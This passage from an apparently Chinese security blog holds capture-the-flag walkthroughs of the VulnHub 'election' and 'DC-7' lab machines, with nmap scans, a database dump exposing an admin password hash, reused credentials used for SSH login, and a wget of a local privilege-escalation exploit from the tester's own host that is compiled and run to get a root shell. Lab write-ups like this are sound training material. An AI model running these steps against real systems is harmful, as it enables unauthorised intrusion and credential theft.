class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$localize</span>[alert_session_expired]&lt;script&gt;setTimeout(function()&#123;top.location=&#x27;./?_nosession&#x27;;&#125;,1000)&lt;/script&gt;&quot;</span>;<br>    <span class="hljs-built_in">exit</span>();<br>  &#125;<br>  <span class="hljs-variable">$countdown</span> = <span class="hljs-string">&quot;&lt;span id=\&quot;waktu\&quot; data-kadaluarsa=\&quot;<span class="hljs-variable">$_SESSION</span>[os_pemilih_kadaluarsa]\&quot; data-multivote=\&quot;&quot;</span>.<span class="hljs-variable">$election</span> -&gt; getSettings(<span class="hljs-string">&quot;multivote&quot;</span>).<span class="hljs-string">&quot;\&quot;&gt;<span class="hljs-variable">$localize</span>[text_loading]&lt;/span&gt;&quot;</span>;<br><br>  include <span class="hljs-variable">$election</span> -&gt; getThemeFile(<span class="hljs-string">&quot;election.php&quot;</span>);<br><br>  <span class="hljs-variable">$election</span> -&gt; db_disconnect();<br>?&gt;<br></code></pre></td></tr></table></figure><p>的确有数据库用户名和密码，尝试进入数据库看看</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><code class="hljs bash">love@election:/var/www/html/election/admin/inc$ mysql -unewuser -p<br>Enter password: <br>Welcome to the MariaDB monitor.  Commands end with ; or \g.<br>Your MariaDB connection <span class="hljs-built_in">id</span> is 7874<br>Server version: 10.1.44-MariaDB-0ubuntu0.18.04.1 Ubuntu 18.04<br><br>Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.<br><br>Type <span class="hljs-string">&#x27;help;&#x27;</span> or <span class="hljs-string">&#x27;\h&#x27;</span> <span class="hljs-keyword">for</span> <span class="hljs-built_in">help</span>. Type <span class="hljs-string">&#x27;\c&#x27;</span> to clear the current input statement.<br><br>MariaDB [(none)]&gt; show databases;<br>+--------------------+<br>| Database           |<br>+--------------------+<br>| election           |<br>| information_schema |<br>| mysql              |<br>| performance_schema |<br>+--------------------+<br>4 rows <span class="hljs-keyword">in</span> <span class="hljs-built_in">set</span> (0.00 sec)<br><br>MariaDB [(none)]&gt; use election<br>Reading table information <span class="hljs-keyword">for</span> completion of table and column names<br>You can turn off this feature to get a quicker startup with -A<br><br>Database changed<br>MariaDB [election]&gt; show tables;<br>+--------------------+<br>| Tables_in_election |<br>+--------------------+<br>| tb_guru            |<br>| tb_hakpilih        |<br>| tb_kandidat        |<br>| tb_level           |<br>| tb_panitia         |<br>| tb_pengaturan      |<br>| tb_polling         |<br>| tb_siswa           |<br>+--------------------+<br>8 rows <span class="hljs-keyword">in</span> <span class="hljs-built_in">set</span> (0.00 sec)<br><br>MariaDB [election]&gt; <span class="hljs-keyword">select</span> * from tb_guru;<br>Empty <span class="hljs-built_in">set</span> (0.00 sec)<br><br>MariaDB [election]&gt; <span class="hljs-keyword">select</span> * from tb_hakpilih;<br>Empty <span class="hljs-built_in">set</span> (0.00 sec)<br><br>MariaDB [election]&gt; <span class="hljs-keyword">select</span> * from tb_kandidat;<br>+----+------+-------+--------+------+<br>| <span class="hljs-built_in">id</span> | nama | kelas | bio    | fbid |<br>+----+------+-------+--------+------+<br>| 76 | Love | 1     | admin1 |      |<br>+----+------+-------+--------+------+<br>1 row <span class="hljs-keyword">in</span> <span class="hljs-built_in">set</span> (0.00 sec)<br><br>MariaDB [election]&gt; <span class="hljs-keyword">select</span> * from tb_level;<br>+----+---------------+<br>| <span class="hljs-built_in">id</span> | level         |<br>+----+---------------+<br>|  1 | Administrator |<br>|  2 | Registrator   |<br>|  3 | Inspector     |<br>+----+---------------+<br>3 rows <span class="hljs-keyword">in</span> <span class="hljs-built_in">set</span> (0.00 sec)<br><br>MariaDB [election]&gt; <span class="hljs-keyword">select</span> * from tb_panitia;<br>+----+----------+------+-------+----------------------------------+<br>| <span class="hljs-built_in">id</span> | no_induk | nama | level | password                         |<br>+----+----------+------+-------+----------------------------------+<br>|  1 | 1234     | Love |     1 | bb113886b0513a9d882e3caa5cd73314 |<br>+----+----------+------+-------+----------------------------------+<br>1 row <span class="hljs-keyword">in</span> <span class="hljs-built_in">set</span> (0.00 sec)<br><br>MariaDB [election]&gt; <span class="hljs-keyword">select</span> * from tb_pengaturan;<br>+----+----------+---------------------------+------------------+--------+-----------+----------+-------------+------------------+---------------------+----------+------------------+---------+---------+---------+<br>| <span class="hljs-built_in">id</span> | judul    | subjudul                  | instansi         | themes | multivote | nullvote | enable_poll | election_timeout | disabled_text       | timezone | default_language | logging | v_major | v_minor |<br>+----+----------+---------------------------+------------------+--------+-----------+----------+-------------+------------------+---------------------+----------+------------------+---------+---------+---------+<br>|  1 | eLection | Web Based Election System | Tripath Projects | shards |         1 |        0 |           1 | 5 minutes        | Election is closed. | default  | en-us            |       1 |       2 |       0 |<br>+----+----------+---------------------------+------------------+--------+-----------+----------+-------------+------------------+---------------------+----------+------------------+---------+---------+---------+<br>1 row <span class="hljs-keyword">in</span> <span class="hljs-built_in">set</span> (0.00 sec)<br></code></pre></td></tr></table></figure><p>拿到了一个新的密码，结合数据库链接密码，尝试进行密码碰撞，看看 root 的密码有没有可能是其中之一</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">love@election:/var/www/html/election/admin/inc$ su -<br>Password: <br>su: Authentication failure<br>love@election:/var/www/html/election/admin/inc$ su -<br>Password: <br>su: Authentication failure<br></code></pre></td></tr></table></figure><p>失败，看了眼数据库提权，也无法利用，在这里卡了很久，尝试利用数据库中的信息登录网站看看，但是网站连接似乎有点问题，密码提示失败。后续又跑去看了进程和网络连接的状况，均没有收获。而定时任务中也没有信息。</p><h3 id="Serv-U-FTP-Server-提权"><a href="#Serv-U-FTP-Server-提权" class="headerlink" title="Serv-U FTP Server 提权"></a>Serv-U FTP Server 提权</h3><p>卡了许久，最后尝试搜索 SUID 中不熟悉文件的 exploit</p><p><img src="/pic/08e7c92edbdc1bbdfe4c25df468ba650_MD5.png"></p><p>发现了可能存在的漏洞，将其下载到本地再上传到靶机</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs bash">love@election:/tmp$ wget http://192.168.56.106:8088/47009.c<br>--2023-07-15 16:02:13--  http://192.168.56.106:8088/47009.c<br>Connecting to 192.168.56.106:8088... connected.<br>HTTP request sent, awaiting response... 200 OK<br>Length: 588 [text/x-csrc]<br>Saving to: ‘47009.c’<br><br>47009.c                       100%[==============================================&gt;]     588  --.-KB/s    <span class="hljs-keyword">in</span> 0s      <br><br>2023-07-15 16:02:13 (62.5 MB/s) - ‘47009.c’ saved [588/588]<br><br>love@election:/tmp$ gcc 47009.c -o pe &amp;&amp; ./pe<br>uid=0(root) gid=0(root) <span class="hljs-built_in">groups</span>=0(root),4(adm),24(cdrom),30(dip),33(www-data),46(plugdev),116(lpadmin),126(sambashare),1000(love)<br>opening root shell<br><span class="hljs-comment"># whoami</span><br>root<br><span class="hljs-comment"># id</span><br>uid=0(root) gid=0(root) <span class="hljs-built_in">groups</span>=0(root),4(adm),24(cdrom),30(dip),33(www-data),46(plugdev),116(lpadmin),126(sambashare),1000(love)<br><span class="hljs-comment"># ip a</span><br>1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000                          <br>    <span class="hljs-built_in">link</span>/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00                                                            <br>    inet 127.0.0.1/8 scope host lo                                                                                   <br>       valid_lft forever preferred_lft forever                                                                       <br>    inet6 ::1/128 scope host                                                                                         <br>       valid_lft forever preferred_lft forever                                                                       <br>2: enp0s3: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc fq_codel state UP group default qlen 1000                <br>    <span class="hljs-built_in">link</span>/ether 08:00:27:fe:c8:1d brd ff:ff:ff:ff:ff:ff                                                               <br>    inet 192.168.56.128/24 brd 192.168.56.255 scope global dynamic noprefixroute enp0s3                              <br>       valid_lft 516sec preferred_lft 516sec                                                                         <br>    inet6 fe80::321e:9192:79f9:852/64 scope <span class="hljs-built_in">link</span> noprefixroute                                                       <br>       valid_lft forever preferred_lft forever <br><span class="hljs-comment"># cd /root</span><br><span class="hljs-comment"># ls -liah</span><br>total 44K<br>262148 drwx------  6 root root 4.0K Jul 14 19:09 .<br>     2 drwxr-xr-x 24 root root 4.0K Apr  8  2020 ..<br>262347 -rw-------  1 root root   66 May 27  2020 .bash_history<br>262346 drwx------  3 root root 4.0K Apr  8  2020 .cache<br>287891 drwx------  5 root root 4.0K May 27  2020 .config<br>295202 drwx------  3 root root 4.0K Oct 20  2019 .gnupg<br>295197 drwxr-xr-x  3 root root 4.0K Oct 20  2019 .<span class="hljs-built_in">local</span><br>262348 -rw-r--r--  1 root root  148 Aug 17  2015 .profile<br>282877 -rw-r--r--  1 root root   33 Apr  9  2020 root.txt<br>262647 -rw-r--r--  1 root root   66 Apr  2  2020 .selected_editor<br>262149 -rw-r-----  1 root root    5 Jul 14 19:09 .vboxclient-display-svga.pid<br><span class="hljs-comment"># cat root.txt</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>knowledge_database</category>
      
      <category>vulnhub</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>DC-7 靶机</title>
    <link href="/2023/07/c67b9582251d.html"/>
    <url>/2023/07/c67b9582251d.html</url>
    
    <content type="html"><![CDATA[<h1 id="DC-7-靶机"><a href="#DC-7-靶机" class="headerlink" title="DC-7 靶机"></a>DC-7 靶机</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ sudo nmap --min-rate 10000 -p- 192.168.56.126<br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-11 02:59 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.126<br>Host is up (0.00016s latency).<br>Not shown: 65533 closed tcp ports (reset)<br>PORT   STATE SERVICE<br>22/tcp open  ssh<br>80/tcp open  http<br>MAC Address: 08:00:27:A8:C2:95 (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 9.61 seconds<br></code></pre></td></tr></table></figure><p>只开放了两个端口</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ sudo nmap --top-ports 20 -sU 192.168.56.126  <br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-11 03:00 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.126<br>Host is up (0.00052s latency).<br><br>PORT      STATE         SERVICE<br>53/udp    closed        domain<br>67/udp    open|filtered dhcps<br>68/udp    open|filtered dhcpc<br>69/udp    open|filtered tftp<br>123/udp   closed        ntp<br>135/udp   closed        msrpc<br>137/udp   closed        netbios-ns<br>138/udp   closed        netbios-dgm<br>139/udp   open|filtered netbios-ssn<br>161/udp   open|filtered snmp<br>162/udp   open|filtered snmptrap<br>445/udp   open|filtered microsoft-ds<br>500/udp   closed        isakmp<br>514/udp   closed        syslog<br>520/udp   open|filtered route<br>631/udp   closed        ipp<br>1434/udp  closed        ms-sql-m<br>1900/udp  open|filtered upnp<br>4500/udp  closed        nat-t-ike<br>49152/udp open|filtered unknown<br>MAC Address: 08:00:27:A8:C2:95 (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 14.84 seconds<br></code></pre></td></tr></table></figure><p>UDP 扫描没收获</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ sudo nmap -sT -sV -sC -O -p22,80 192.168.56.126               <br>[sudo] password <span class="hljs-keyword">for</span> kali: <br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-11 03:03 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.126<br>Host is up (0.00077s latency).<br><br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)<br>| ssh-hostkey: <br>|   2048 d0:02:e9:c7:5d:95:32:ab:10:99:89:84:34:3d:1e:f9 (RSA)<br>|   256 d0:d6:40:35:a7:34:a9:0a:79:34:ee:a9:6a:<span class="hljs-built_in">dd</span>:f4:8f (ECDSA)<br>|_  256 a8:55:d5:76:93:ed:4f:6f:f1:f7:a1:84:2f:af:bb:e1 (ED25519)<br>80/tcp open  http    Apache httpd 2.4.25 ((Debian))<br>|_http-title: Welcome to DC-7 | D7<br>| http-robots.txt: 22 disallowed entries (15 shown)<br>| /core/ /profiles/ /README.txt /web.config /admin/ <br>| /comment/reply/ /filter/tips /node/add/ /search/ /user/register/ <br>| /user/password/ /user/login/ /user/logout/ /index.php/admin/ <br>|_/index.php/comment/reply/<br>|_http-server-header: Apache/2.4.25 (Debian)<br>|_http-generator: Drupal 8 (https://www.drupal.org)<br>MAC Address: 08:00:27:A8:C2:95 (Oracle VirtualBox virtual NIC)<br>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br>Device <span class="hljs-built_in">type</span>: general purpose<br>Running: Linux 3.X|4.X<br>OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4<br>OS details: Linux 3.2 - 4.9<br>Network Distance: 1 hop<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 15.76 seconds<br></code></pre></td></tr></table></figure><p>有 <code>robots.txt</code> 文件，nmap 漏洞脚本扫描一下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ sudo nmap --script=vuln -p22,80 192.168.56.126               <br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-11 03:07 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.126<br>Host is up (0.00042s latency).<br><br>PORT   STATE SERVICE<br>22/tcp open  ssh<br>80/tcp open  http<br>| http-csrf: <br>| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=192.168.56.126<br>|   Found the following possible CSRF vulnerabilities: <br>|     <br>|     Path: http://192.168.56.126:80/<br>|     Form <span class="hljs-built_in">id</span>: search-block-form<br>|     Form action: /search/node<br>|     <br>|     Path: http://192.168.56.126:80/user/login<br>|     Form <span class="hljs-built_in">id</span>: user-login-form<br>|     Form action: /user/login<br>|     <br>|     Path: http://192.168.56.126:80/user/login<br>|     Form <span class="hljs-built_in">id</span>: search-block-form<br>|     Form action: /search/node<br>|     <br>|     Path: http://192.168.56.126:80/node/1<br>|     Form <span class="hljs-built_in">id</span>: search-block-form<br>|     Form action: /search/node<br>|     <br>|     Path: http://192.168.56.126:80/search/node<br>|     Form <span class="hljs-built_in">id</span>: search-form<br>|     Form action: /search/node<br>|     <br>|     Path: http://192.168.56.126:80/search/node<br>|     Form <span class="hljs-built_in">id</span>: search-block-form<br>|     Form action: /search/node<br>|     <br>|     Path: http://192.168.56.126:80/user/password<br>|     Form <span class="hljs-built_in">id</span>: user-pass<br>|     Form action: /user/password<br>|     <br>|     Path: http://192.168.56.126:80/user/password<br>|     Form <span class="hljs-built_in">id</span>: search-block-form<br>|     Form action: /search/node<br>|     <br>|     Path: http://192.168.56.126:80/user/login<br>|     Form <span class="hljs-built_in">id</span>: user-login-form<br>|     Form action: /user/login<br>|     <br>|     Path: http://192.168.56.126:80/user/login<br>|     Form <span class="hljs-built_in">id</span>: search-block-form<br>|     Form action: /search/node<br>|     <br>|     Path: http://192.168.56.126:80/node/<br>|     Form <span class="hljs-built_in">id</span>: search-block-form<br>|     Form action: /search/node<br>|     <br>|     Path: http://192.168.56.126:80/search/node/help<br>|     Form <span class="hljs-built_in">id</span>: search-block-form<br>|     Form action: /search/node<br>|     <br>|     Path: http://192.168.56.126:80/search/node<br>|     Form <span class="hljs-built_in">id</span>: search-form<br>|     Form action: /search/node<br>|     <br>|     Path: http://192.168.56.126:80/search/node<br>|     Form <span class="hljs-built_in">id</span>: search-block-form<br>|     Form action: /search/node<br>|     <br>|     Path: http://192.168.56.126:80/search/node<br>|     Form <span class="hljs-built_in">id</span>: search-form<br>|     Form action: /search/node<br>|     <br>|     Path: http://192.168.56.126:80/search/node<br>|     Form <span class="hljs-built_in">id</span>: search-block-form<br>|     Form action: /search/node<br>|     <br>|     Path: http://192.168.56.126:80/search/node/<br>|     Form <span class="hljs-built_in">id</span>: search-form<br>|     Form action: /search/node/<br>|     <br>|     Path: http://192.168.56.126:80/search/node/<br>|     Form <span class="hljs-built_in">id</span>: search-block-form<br>|_    Form action: /search/node<br>|_http-dombased-xss: Couldn<span class="hljs-string">&#x27;t find any DOM based XSS.</span><br><span class="hljs-string">|_http-stored-xss: Couldn&#x27;</span>t find any stored XSS vulnerabilities.<br>| http-enum: <br>|   /rss.xml: RSS or Atom feed<br>|   /robots.txt: Robots file<br>|   /INSTALL.txt: Drupal file<br>|   /: Drupal version 8 <br>|_  /README.txt: Interesting, a readme.<br>MAC Address: 08:00:27:A8:C2:95 (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 115.43 seconds<br></code></pre></td></tr></table></figure><p>依然没收获，看看 web 界面吧</p><h2 id="web-服务查看"><a href="#web-服务查看" class="headerlink" title="web 服务查看"></a>web 服务查看</h2><p><img src="/pic/150cdb5ed6cb4f340a6f1689bd4a0efb_MD5.png"></p><p>提示爆破和目录爆破是无效的，要跳出靶机向外看，这句话卡了我好久，甚至尝试了用 drupal 的新漏洞尝试能不能打进去，都失败了。唯一能确定的是，我通过重置密码的界面，确定了 <code>DC7USER</code> 是一个用户名。</p><h2 id="网络情报"><a href="#网络情报" class="headerlink" title="网络情报"></a>网络情报</h2><p>最后看了眼 WP，才意识到这个 <code>@DC7USER</code> 实际上常见于 GitHub 或者推特的个人账户，一是自己敏感度的问题，二是一些网络习惯。</p><p><img src="/pic/dce52fb8d2b20c11f8f65bfa952278a3_MD5.png"></p><p>点进去 github 链接，发现是后台的源码，也很合理。接下来思路就很顺畅了，找配置文件看看数据库密码是否被重用</p><p><img src="/pic/3c8f7072043e9938212dd3838bb6e52b_MD5.png"></p><h2 id="密码重用"><a href="#密码重用" class="headerlink" title="密码重用"></a>密码重用</h2><p>用用户名和密码登录后台失败，考虑到还开着 22 端口因此尝试 ssh 登录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/dc_7]<br>└─$ ssh dc7user@192.168.56.127    <br>The authenticity of host <span class="hljs-string">&#x27;192.168.56.127 (192.168.56.127)&#x27;</span> can<span class="hljs-string">&#x27;t be established.</span><br><span class="hljs-string">ED25519 key fingerprint is SHA256:BDWqBUcitB8KKGYDyoeZkt2C/aXhZ7gi5xSEtOSB+Rk.</span><br><span class="hljs-string">This key is not known by any other names.</span><br><span class="hljs-string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span><br><span class="hljs-string">Warning: Permanently added &#x27;</span>192.168.56.127<span class="hljs-string">&#x27; (ED25519) to the list of known hosts.</span><br><span class="hljs-string">dc7user@192.168.56.127&#x27;</span>s password: <br>Linux dc-7 4.9.0-9-amd64 <span class="hljs-comment">#1 SMP Debian 4.9.168-1+deb9u5 (2019-08-11) x86_64</span><br><br>The programs included with the Debian GNU/Linux system are free software;<br>the exact distribution terms <span class="hljs-keyword">for</span> each program are described <span class="hljs-keyword">in</span> the<br>individual files <span class="hljs-keyword">in</span> /usr/share/doc/*/copyright.<br><br>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent<br>permitted by applicable law.<br>No mail.<br>Last login: Fri Aug 30 03:10:09 2019 from 192.168.0.100<br>dc7user@dc-7:~$ <span class="hljs-built_in">whoami</span><br>dc7user<br>dc7user@dc-7:~$ <span class="hljs-built_in">id</span><br>uid=1000(dc7user) gid=1000(dc7user) <span class="hljs-built_in">groups</span>=1000(dc7user),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev)<br>dc7user@dc-7:~$ sudo -l<br>-bash: sudo: <span class="hljs-built_in">command</span> not found<br>dc7user@dc-7:/usr/bin$ <span class="hljs-built_in">uname</span> -a<br>Linux dc-7 4.9.0-9-amd64 <span class="hljs-comment">#1 SMP Debian 4.9.168-1+deb9u5 (2019-08-11) x86_64 GNU/Linux</span><br><br></code></pre></td></tr></table></figure><p>看看家目录下有没有什么有价值的东西</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">dc7user@dc-7:~$ <span class="hljs-built_in">ls</span> -liah<br>total 40K<br>262914 drwxr-xr-x 5 dc7user dc7user 4.0K Aug 30  2019 .<br>262321 drwxr-xr-x 3 root    root    4.0K Aug 29  2019 ..<br>143381 drwxr-xr-x 2 dc7user dc7user 4.0K Aug 30  2019 backups<br>269898 lrwxrwxrwx 1 dc7user dc7user    9 Aug 29  2019 .bash_history -&gt; /dev/null<br>268307 -rw-r--r-- 1 dc7user dc7user  220 Aug 29  2019 .bash_logout<br>268283 -rw-r--r-- 1 dc7user dc7user 3.9K Aug 29  2019 .bashrc<br>271693 drwxr-xr-x 3 dc7user dc7user 4.0K Aug 29  2019 .drush<br>143656 drwx------ 3 dc7user dc7user 4.0K Aug 29  2019 .gnupg<br>272762 -rw------- 1 dc7user dc7user 7.8K Aug 30  2019 mbox<br>268426 -rw-r--r-- 1 dc7user dc7user  675 Aug 29  2019 .profile<br></code></pre></td></tr></table></figure><p>有个 mbox 文件和.drush, .gnupg 文件夹，问问 chatgpt 吧</p><p><img src="/pic/75519cc14576809854d3b31fc8527f64_MD5.png"></p><p>进入到.drush 文件夹中并没有看到 yml 文件，那就先看看 mbox 